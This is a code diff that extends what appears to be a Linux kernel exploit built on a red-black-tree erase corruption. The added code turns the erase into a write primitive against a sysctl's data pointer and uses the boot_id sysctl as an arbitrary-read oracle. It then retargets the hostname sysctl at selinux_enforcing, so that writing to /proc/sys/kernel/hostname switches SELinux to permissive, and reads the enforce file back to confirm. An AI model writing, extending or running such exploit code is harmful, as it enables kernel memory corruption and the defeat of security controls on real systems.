@@ -240,7 +240,12 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
 #else
     {0, slide_oracle_parent, "tree_pc"},
     {1, 0, "tree_right"},
-    {2, slide_oracle_child ? slide_oracle_child : slide_oracle_target,
+    /* tree_left = the rb_erase write value: DIRECT_ERASE_WRITE plants
+     * slide_oracle_target (=DIRECT_WRITE_VALUE) into B via the one-child
+     * `str child,[parent_child_slot]` path; DIRECT_BOOTID_CHILD plants
+     * slide_oracle_child (Q) into &ctl_table.data (arbitrary read). */
+    {2, getenv("DIRECT_ERASE_WRITE") ? slide_oracle_target
+       : (slide_oracle_child ? slide_oracle_child : slide_oracle_target),
      "tree_left"},
     {3, slide_oracle_parent, "pi_pc"},
     {4, 0, "pi_right"},
@@ -1085,7 +1090,31 @@ static int slide_trigger_physical_slot(size_t slot) {
     snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
     SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
     if (slide_trigger_physical_state()) {
-      if (getenv("DIRECT_BOOTID_RECLAIM")) {
+      if (getenv("DIRECT_ERASE_WRITE")) {
+        /* After the erase, B (=DIRECT_BOOTID_ADDR, a writable sysctl's
+         * ctl_table.data) holds DIRECT_WRITE_VALUE.  Confirm by reading the
+         * target back through the boot_id arb-read oracle. */
+        pr_info("direct-erase-write fired parent=%016zx value=%016zx\n",
+                slide_oracle_parent, slide_oracle_target);
+        if (getenv("DIRECT_SELINUX_DISABLE")) {
+          /* B = hostname ctl_table.data was retargeted to selinux_enforcing.
+           * Write a NUL to /proc/sys/kernel/hostname -> *selinux_enforcing=0.
+           * Then read /sys/fs/selinux/enforce to prove permissive. */
+          int hfd = open("/proc/sys/kernel/hostname", O_WRONLY | O_CLOEXEC);
+          ssize_t wr = hfd >= 0 ? write(hfd, "", 1) : -1;
+          if (hfd >= 0) {
+            close(hfd);
+          }
+          char eb[8] = {0};
+          int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
+          ssize_t er = efd >= 0 ? read(efd, eb, sizeof(eb) - 1) : -1;
+          if (efd >= 0) {
+            close(efd);
+          }
+          pr_info("direct selinux-disable hostname_wr=%zd enforce=%s er=%zd\n",
+                  wr, eb, er);
+        }
+      } else if (getenv("DIRECT_BOOTID_RECLAIM")) {
         /* After the erase, the boot_id sysctl points at the arbitrary-read
          * oracle.  Read it to prove the walk completed and the retarget
          * landed (reclaim success), vs. a fire that panics (reclaim miss). */
